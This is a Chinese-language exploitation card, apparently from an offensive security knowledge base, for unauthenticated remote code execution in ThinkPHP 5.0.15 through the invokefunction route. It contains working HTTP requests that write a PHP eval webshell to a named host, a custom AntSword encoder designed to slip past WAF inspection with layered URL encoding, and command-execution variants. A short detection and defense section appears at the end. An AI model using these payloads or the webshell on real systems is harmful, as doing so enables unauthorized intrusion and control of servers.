---
id: web-php-framework-thinkphp-invokefunction-file-put-contents-webshell
title: ThinkPHP 5.0.15 invokefunction 写 WebShell：call_user_func_array 调 file_put_contents + 三次 URL 解码蚁剑编码器
type: scenario
domain: web
path: web/php/framework
technique: thinkphp-invokefunction-file-put-contents-webshell
tags:
- php
- thinkphp
- invokefunction
- file-put-contents
- webshell
- antsword
- rce
- urlencode
cve: []
severity: critical
confidence: high
status: draft
affected_versions: ThinkPHP 5.0.15（原文报错页指纹）
created: '2026-11-07'
updated: '2026-11-07'
url: /docs/web/php/framework/web-php-framework-thinkphp-invokefunction-file-put-contents-webshell/
draft: false
kb_aliases:
- ThinkPHP 写马
- invokefunction file_put_contents
- ThinkPHP 5.0.15 RCE
- 三次 URL 解码 webshell
- 蚁剑自定义编码器
---

## 一句话结论

ThinkPHP 5.0.15 未授权访问 `index/think\app/invokefunction` 时，可令 `function=call_user_func_array`、`vars[0]=file_put_contents`，把 `vars[1][0]` 指定为 `../../9.php`、`vars[1][1]` 指定为 PHP 代码，直接向 Web 目录写入 WebShell；WebShell 内做三次 `urldecode`，配合蚁剑自定义编码器即可稳定执行命令。

## 原理

- ThinkPHP 5.x 的 `s=index/\think\app/invokefunction` 路由会进入 `\think\App::invokeFunction`，该方法从请求参数读取函数名与参数并执行 `call_user_func_array($function, $vars)`，函数名和参数完全可控且无白名单。
- 把 `function` 设为 `call_user_func_array`，`vars[0]` 设为 `file_put_contents`，就形成 `call_user_func_array('file_put_contents', [路径, 内容])`：第一个参数是写入路径，第二个是文件内容。`../../` 可把路径从 `public/` 上跳到站点根目录或其他可写目录，从而落一个可访问的 `.php` 文件。
- 先写一个内容为 `test123` 的文件并访问，可确认路径穿越深度与目录可写；再写入 `<?php eval(urldecode(urldecode(urldecode($_REQUEST['xx']))));?>` 的 WebShell，后续命令都放在 `xx` 参数中。
- WebShell 对参数连续三次 `urldecode`：编码端（蚁剑自定义编码器）对 payload 做两次 `percent-encode`，再叠加 HTTP 传输/框架解析的一层 URL 解码，最终把多层编码的 payload 还原为明文；这样能穿过只检查一次 URL 解码的 WAF/日志规则。
- 该链只要求 Web 进程对目标目录有写权限；`file_put_contents` 通常不在 `disable_functions` 中，因此即使命令执行函数被禁，也能先落地 WebShell，再考虑后续绕过。

## 触发条件

- 目标运行 ThinkPHP 5.x（案例报错页显示 V5.0.15），默认路由可访问 `index.php?s=...`。
- Web 进程对站点目录或其父目录有写权限，且写入的 `.php` 路径可被 Web 访问。
- 无认证要求；若存在 WAF，需要对 `\think\app`、`call_user_func_array`、`file_put_contents` 等关键字做编码/变形。
- 如需进一步执行系统命令，WebShell 需能调用 `eval`，且命令函数未被 `disable_functions` 完全限制（受限时见关联卡）。

## 利用步骤

1. 指纹与版本确认：访问站点，触发报错页/查看 `ThinkPHP V5` 页面，案例确认版本为 V5.0.15。
2. 验证写文件：请求 invokefunction，令 `vars[0]=file_put_contents`、`vars[1][0]=../../1.php`、`vars[1][1]=test123`，访问 `http://target/1.php` 应返回 `test123`，确认路径深度与写权限。
3. 写入 WebShell：把内容替换为 `<?php eval(urldecode(urldecode(urldecode($_REQUEST['xx']))));?>`，路径改为 `../../9.php`（按实际目录调整 `../` 层数）。
4. 蚁剑添加记录：URL 填 `http://target/9.php`，连接密码填 `xx`，编码设置 UTF-8，编码器选择自定义的“三次 URL”编码器。
5. 编码器对 payload 连续做两次 `forceEncode`（每个字符转 `%XX`），保存后测试连接；若失败，检查 `../` 层数、WebShell 是否被 WAF 改写、编码层数是否匹配。
6. 连接成功后执行命令、浏览文件；若命令返回 127/空，说明命令函数被禁用，改用 UAF 绕过（见关联卡）。

## PoC

```http
GET /vulntarget/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=../../1.php&vars[1][1]=test123 HTTP/1.1
Host: www.cjo6w10yls.com
```

```http
GET /vulntarget/public/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=../../9.php&vars[1][1]=%3C?php%20eval(urldecode(urldecode(urldecode($_REQUEST['xx']))));?%3E HTTP/1.1
Host: www.cjo6w10yls.com
```

蚁剑自定义编码器（关键部分）：

```javascript
function forceEncode(s) {
  return Array.from(s).map(i => '%' + i.charCodeAt(0).toString(16).padStart(2, '0')).join('');
}
module.exports = (pwd, data, ext = {}) => {
  const payload = data['_'];
  data[pwd] = forceEncode(forceEncode(payload)); // 两次 percent-encode，配合 shell 的三次 urldecode
  delete data['_'];
  return data;
};
```

访问 `http://target/1.php` 返回 `test123` 即写入成功；`9.php` 连接成功后即可执行命令。

## 变体与关联

- 直接命令执行变体：同一 invokefunction 链把 `vars[0]` 换成 `system`，`vars[1][]` 放命令；见 `web-php-framework-thinkphp-5x-invokefunction-captcha-rce`。
- captcha 链变体：`POST s=captcha` + `_method=__construct&filter[]=system&server[REQUEST_METHOD]=命令`。
- 路径穿越深度：`../../` 的层数取决于入口脚本所在目录（`public/`、`index.php` 位置），可先写测试文件确认。
- WAF 变形：对反斜杠、方括号、函数名做 URL/Unicode 编码，或改用 `file_put_contents` 的其他别名/回调。
- 命令函数被禁用：可用 PHP7 GC UAF / Backtrace UAF 等公开 exploit 绕过（见 `web-php-rce-php7-backtrace-uaf-disable-functions-bypass`、`web-php-rce-uaf-memory-corruption-disable-functions-bypass`）。

## 检测与防御

- 升级 ThinkPHP 到修复版本；禁用或限制 `invokefunction` 路由，禁止用户控制 `call_user_func_array` 的 function/vars。
- WAF 拦截 `s=index/\think\app/invokefunction`、`call_user_func_array`、`file_put_contents` 组合；对多次 URL 编码的请求做解码后再检测。
- 监控 Web 目录新增/修改的 `.php` 文件，部署文件完整性校验与 Webshell 检测；限制 Web 进程对非上传目录的写权限。
